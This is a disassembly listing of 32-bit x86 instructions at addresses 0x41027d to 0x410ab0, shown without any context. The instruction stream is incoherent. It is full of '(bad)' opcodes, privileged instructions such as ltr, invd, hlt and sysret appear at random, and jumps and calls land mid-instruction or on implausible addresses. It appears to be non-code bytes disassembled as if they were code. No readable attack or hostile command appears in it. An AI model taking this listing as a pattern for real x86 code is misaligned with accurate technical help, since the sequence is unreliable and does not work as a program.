  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
